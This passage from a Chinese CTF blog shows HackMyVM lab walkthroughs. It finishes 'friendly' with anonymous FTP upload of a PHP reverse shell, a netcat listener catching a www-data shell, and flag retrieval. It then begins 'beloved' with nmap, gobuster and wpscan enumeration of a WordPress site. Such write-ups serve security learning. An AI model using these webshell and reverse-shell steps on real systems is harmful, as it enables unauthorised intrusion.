/.htaccess.save</span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">05</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /.htaccess_orig</span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">05</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /.htaccess_extra</span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">05</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /.htaccess.sample</span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">05</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /.htaccess_sc</span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">05</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /.htaccessOLD</span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">05</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /.htaccessOLD2</span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">05</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /.htaccessBAK</span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">05</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /.html</span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">05</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /.htm                                            </span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">05</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /.htpasswd_test</span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">05</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /.httr<span class="literal">-oauth</span>                                     </span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">05</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /.htpasswds</span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">06</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /.php                                            </span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">29</span>] <span class="number">200</span> -   <span class="number">10</span>KB - /index.html                                       </span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">41</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /server<span class="literal">-status</span>                                    </span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">41</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /server<span class="literal">-status</span>/  </span><br></pre></td></tr></table></figure>

<p>ftp上传一下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">usr</span>/<span class="type">share</span>/<span class="type">laudanum</span>/<span class="type">php</span>]</span><br><span class="line">└─<span class="comment"># ftp 192.168.56.131</span></span><br><span class="line">Connected to <span class="number">192.168</span>.<span class="number">56.131</span>.</span><br><span class="line"><span class="number">220</span> ProFTPD Server (friendly) <span class="function">[::<span class="type">ffff</span>:<span class="number">192.168</span><span class="type">.56.131</span>]</span></span><br><span class="line">Name (<span class="number">192.168</span>.<span class="number">56.131</span>:ace): anonymous</span><br><span class="line"><span class="number">331</span> Anonymous login ok, send your complete email address as your password</span><br><span class="line">Password: </span><br><span class="line"><span class="number">230</span> Anonymous access granted, restrictions apply</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line"><span class="keyword">Using</span> binary mode to transfer files.</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>

<p>上传shell:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; put rece.php</span><br><span class="line">local: rece.php remote: rece.php</span><br><span class="line"><span class="number">229</span> Entering Extended Passive Mode (|||<span class="number">57118</span>|)</span><br><span class="line"><span class="number">150</span> Opening BINARY mode <span class="keyword">data</span> connection <span class="keyword">for</span> rece.php</span><br><span class="line"><span class="number">100</span>% |*****************************************************************************************************|  <span class="number">5496</span>       <span class="number">21.74</span> MiB/s    <span class="number">00</span>:<span class="number">00</span> ETA</span><br><span class="line"><span class="number">226</span> Transfer complete</span><br><span class="line"><span class="number">5496</span> bytes sent <span class="keyword">in</span> <span class="number">00</span>:<span class="number">00</span> (<span class="number">2.16</span> MiB/s)</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>

<p>现在我们只需听 Netcat 并运行反向 shell。为此，我们在 <code>nc -nlvp 1234</code> 面板中输入并在另一个 curl <code>http://$ip/rev.php</code> 中输入（或直接从浏览器加载 URL）：</p>
<p>反弹成功：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nc -lvnp 1234</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">1234</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.56.127</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.56.131</span>] <span class="number">54870</span></span><br><span class="line">Linux friendly <span class="number">5.10</span>.<span class="number">0</span><span class="literal">-21-amd64</span> <span class="comment">#1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux</span></span><br><span class="line"> <span class="number">02</span>:<span class="number">40</span>:<span class="number">36</span> up <span class="number">41</span> min,  <span class="number">0</span> users,  load average: <span class="number">0.00</span>, <span class="number">0.00</span>, <span class="number">0.00</span></span><br><span class="line">USER     TTY      FROM             LOGIN<span class="selector-tag">@</span>   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=<span class="number">33</span>(www<span class="literal">-data</span>) gid=<span class="number">33</span>(www<span class="literal">-data</span>) groups=<span class="number">33</span>(www<span class="literal">-data</span>)</span><br><span class="line">/bin/sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>得到user.txt</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/</span></span><br><span class="line"><span class="string">$ cd home</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">RiJaba1</span></span><br><span class="line"><span class="string">$ cd RiJaba1</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">CTF</span></span><br><span class="line"><span class="string">Private</span></span><br><span class="line"><span class="string">YouTube</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string">$ cat user.txt</span></span><br><span class="line"><span class="string">b8cff8c9008e1c98a1f2937b4475acd6</span></span><br><span class="line"><span class="string">$ </span></span><br></pre></td></tr></table></figure>

<h2 id="4-sudo提权："><a href="#4-sudo提权：" class="headerlink" title="4.sudo提权："></a>4.sudo提权：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find /-name root.txt</span><br><span class="line">find: &#x27;/-name&#x27;: No such file or directory</span><br><span class="line">root.txt</span><br><span class="line">find / -name root.txt</span><br><span class="line">/var/log/apache2/root.txt</span><br><span class="line">/root/root.txt</span><br><span class="line">cat /var/log/apache2/root.txt</span><br><span class="line">66b5c58f3e83aff307441714d3e28d2f</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/25/friendly/" data-id="clmnr8k0b000cso8g9l2t12v4" data-title="friendly" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webshell/" rel="tag">webshell</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-beloved" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/24/beloved/" class="article-date">
  <time class="dt-published" datetime="2023-07-24T05:28:59.000Z" itemprop="datePublished">2023-07-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/07/24/beloved/">beloved</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <!---more--->


<h1 id="beloved-–hackmyvm"><a href="#beloved-–hackmyvm" class="headerlink" title="beloved –hackmyvm"></a>beloved –hackmyvm</h1><h2 id="1-扫描网段"><a href="#1-扫描网段" class="headerlink" title="1.扫描网段"></a>1.扫描网段</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sP 192.168.56.0/24</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-24</span> <span class="number">10</span>:<span class="number">57</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.1</span></span><br><span class="line">Host is up (<span class="number">0.00040</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>A:<span class="number">00</span>:<span class="number">27</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">0</span>A (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.100</span></span><br><span class="line">Host is up (<span class="number">0.00019</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">7</span>E:<span class="number">11</span>:<span class="number">51</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.129</span></span><br><span class="line">Host is up (<span class="number">0.0018</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">01</span>:<span class="number">62</span>:<span class="number">6</span>D (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts up) scanned <span class="keyword">in</span> <span class="number">7.48</span> seconds</span><br></pre></td></tr></table></figure>

<h2 id="2-扫描端口"><a href="#2-扫描端口" class="headerlink" title="2.扫描端口"></a>2.扫描端口</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sC -sV -p- 192.168.56.129</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-24</span> <span class="number">11</span>:<span class="number">05</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.129</span></span><br><span class="line">Host is up (<span class="number">0.0011</span>s latency).</span><br><span class="line">Not shown: <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span>+deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">2048</span> <span class="number">0</span>c3f13546e6ee656d291ebad9536c68d (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">9</span>be68e14397a17a38088cd772ec33b1a (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">855</span>a052a4bc0b236ea8ae28ab2efbcdf (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2.4</span>.<span class="number">38</span> ((Debian))</span><br><span class="line">|_http<span class="literal">-title</span>: Beloved &amp;<span class="comment">#8211; Just another WordPress site</span></span><br><span class="line">| http<span class="literal">-robots</span>.txt: <span class="number">1</span> disallowed entry</span><br><span class="line">|_/wp<span class="literal">-admin</span>/</span><br><span class="line">|_http<span class="literal">-generator</span>: WordPress <span class="number">5.7</span>.<span class="number">2</span></span><br><span class="line">|_http<span class="literal">-server-header</span>: Apache/<span class="number">2.4</span>.<span class="number">38</span> (Debian)</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">01</span>:<span class="number">62</span>:<span class="number">6</span>D (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">10.85</span> seconds</span><br></pre></td></tr></table></figure>

<h2 id="3-访问网页"><a href="#3-访问网页" class="headerlink" title="3.访问网页"></a>3.访问网页</h2><p><img src="/../pic/1.png" alt="image-20230724113901508"></p>
<p>发现wordpress,可能存在漏洞</p>
<h2 id="4-先扫一下目录"><a href="#4-先扫一下目录" class="headerlink" title="4.先扫一下目录"></a>4.先扫一下目录</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.129/ -x php,txt,html    </span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.<span class="number">5</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://<span class="number">192.168</span>.<span class="number">56.129</span>/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 <span class="number">10</span></span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web<span class="literal">-Content</span>/directory<span class="literal">-list-2</span>.<span class="number">3</span><span class="literal">-medium</span>.txt</span><br><span class="line">[+] Negative Status codes:   <span class="number">404</span></span><br><span class="line">[+] User Agent:              gobuster/<span class="number">3.5</span></span><br><span class="line">[+] Extensions:              php,txt,html</span><br><span class="line">[+] Timeout:                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">11</span>:<span class="number">46</span>:<span class="number">26</span> Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.html                (Status: <span class="number">403</span>) [<span class="type">Size</span>: <span class="number">279</span>]</span><br><span class="line">/.php                 (Status: <span class="number">403</span>) [<span class="type">Size</span>: <span class="number">279</span>]</span><br><span class="line">/index.php            (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/]</span><br><span class="line">/rss                  (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="type">feed</span>/]</span><br><span class="line">/login                (Status: <span class="number">302</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="type">beloved</span>/<span class="type">wp</span>-<span class="type">login.php</span>]</span><br><span class="line">/<span class="number">0</span>                    (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="number">0</span>/]</span><br><span class="line">/feed                 (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="type">feed</span>/]</span><br><span class="line">/atom                 (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="type">feed</span>/<span class="type">atom</span>/]</span><br><span class="line">/wp<span class="literal">-content</span>           (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">321</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="type">wp</span>-<span class="type">content</span>/]</span><br><span class="line">/admin                (Status: <span class="number">302</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="type">beloved</span>/<span class="type">wp</span>-<span class="type">admin</span>/]</span><br><span class="line">/wp<span class="literal">-login</span>.php         (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">7054</span>]</span><br><span class="line">/rss2                 (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="type">feed</span>/]</span><br><span class="line">/license.txt          (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">19915</span>]</span><br><span class="line">/wp<span class="literal">-includes</span>          (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">322</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="type">wp</span>-<span class="type">includes</span>/]</span><br><span class="line">/wp<span class="literal">-register</span>.php      (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="type">beloved</span>/<span class="type">wp</span>-<span class="type">login.php</span>?<span class="type">action</span>=<span class="type">register</span>]</span><br><span class="line">/javascript           (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">321</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="type">javascript</span>/]</span><br><span class="line">/wp<span class="literal">-rss2</span>.php          (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="type">beloved</span>/<span class="type">feed</span>/]</span><br><span class="line">/rdf                  (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="type">feed</span>/<span class="type">rdf</span>/]</span><br><span class="line">/page1                (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/]</span><br><span class="line">/readme.html          (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">7345</span>]</span><br><span class="line">/robots.txt           (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">107</span>]</span><br><span class="line">/<span class="string">&#x27;                    (Status: 301) [Size: 0] [--&gt; http://192.168.56.129/]</span></span><br><span class="line"><span class="string">/dashboard            (Status: 302) [Size: 0] [--&gt; http://beloved/wp-admin/]</span></span><br><span class="line"><span class="string">/%20                  (Status: 301) [Size: 0] [--&gt; http://192.168.56.129/]</span></span><br><span class="line"><span class="string">/wp-admin             (Status: 301) [Size: 319] [--&gt; http://192.168.56.129/wp-admin/]</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>发现beloved的站点很多</p>
<p>存储扫一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>

<p><img src="/../pic/2.png" alt="image-20230724120437325"></p>
<h2 id="5-wpscan扫一下"><a href="#5-wpscan扫一下" class="headerlink" title="5.wpscan扫一下"></a>5.wpscan扫一下</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># wpscan --url http://beloved --enumerate vt    </span></span><br></pre></td></tr></table></figure>

<p><img src="/../pic/3.png" alt="image-20230724120854995"></p>
<p>主题没有扫一下插件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># wpscan --url http://beloved --enumerate vp</span></span><br></pre></td></tr></table></figure>

<p><img src="/../pic/4.png" alt="image-20230724121031955"></p>
<p>强力扫一下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># wpscan --url http://beloved --plugins-detection aggressive -t 200</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">[+] Enumerating All Plugins (via Aggressive Methods)</span><br><span class="line"> Checking Known Locations - Time: <span class="number">00</span>:<span class="number">20</span>:<span class="number">29</span> &lt;============================================================&gt; (<span class="number">103493</span> / <span class="number">103493</span>) <span class="number">100.00</span>% Time: <span class="number">00</span>:<span class="number">20</span>:<span class="number">29</span></span><br><span class="line">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line"><span class="function">[<span class="type">i</span>] <span class="title">Plugin</span></span>(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] akismet</span><br><span class="line"> | Location: http://beloved/wp<span class="literal">-content</span>/plugins/akismet/</span><br><span class="line"> | Latest Version: <span class="number">5.2</span></span><br><span class="line"> | Last Updated: <span class="number">2023</span><span class="literal">-06-21T14</span>:<span class="number">59</span>:<span class="number">00.000</span>Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://beloved/wp<span class="literal">-content</span>/plugins/akismet/, status: <span class="number">403</span></span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br><span class="line"></span><br><span class="line">[+] feed</span><br><span class="line"> | Location: http://beloved/wp<span class="literal">-content</span>/plugins/feed/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://beloved/wp<span class="literal">-content</span>/plugins/feed/, status: <span class="number">200</span></span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br><span class="line"></span><br><span class="line">[+] wpdiscuz</span><br><span class="line"> | Location: http://beloved/wp<span class="literal">-content</span>/plugins/wpdiscuz/</span><br><span class="line"> | Last Updated: <span class="number">2023</span><span class="literal">-06-03T12</span>:<span class="number">37</span>:<span class="number">00.000</span>Z</span><br><span class="line"> | Readme: http://beloved/wp<span class="literal">-content</span>/plugins/wpdiscuz/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is <span class="number">7.6</span>.<span class="number">1</span></span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://beloved/wp<span class="literal">-content</span>/plugins/wpdiscuz/, status: <span class="number">200</span></span><br><span class="line"> |</span><br><span class="line"> | Version: <span class="number">7.0</span>.<span class="number">4</span> (<span class="number">80</span>% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://beloved/wp<span class="literal">-content</span>/plugins/wpdiscuz/readme.txt</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: <span class="number">00</span>:<span class="number">00</span>:<span class="number">02</span> &lt;===================================================================&gt; (<span class="number">137</span> / <span class="number">137</span>) <span class="number">100.00</span>% Time: <span class="number">00</span>:<span class="number">00</span>:<span class="number">02</span></span><br><span class="line"></span><br><span class="line">[<span class="type">i</span>] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability <span class="keyword">data</span> has not been output.</span><br><span class="line">[!] You can get a free API token with <span class="number">25</span> daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon Jul <span class="number">24</span> <span class="number">12</span>:<span class="number">33</span>:<span class="number">51</span> <span class="number">2023</span></span><br><span class="line">[+] Requests Done: <span class="number">103650</span></span><br><span class="line">[+] Cached Requests: <span class="number">44</span></span><br><span class="line">[+] <span class="keyword">Data</span> Sent: <span class="number">26.335</span> MB</span><br><span class="line">[+] <span class="keyword">Data</span> Received: <span class="number">28.247</span> MB</span><br><span class="line">[+] Memory used: <span class="number">440.398</span> MB</span><br><span class="line">[+] Elapsed time: <span class="number">00</span>:<span class="number">20</span>:<span class="number">48</span></span><br></pre></td></tr></table></figure>

<p>发现三个插件：akismet,feed,wpdiscuz</p>
<p>其中wpdiscuz可以确定版本</p>
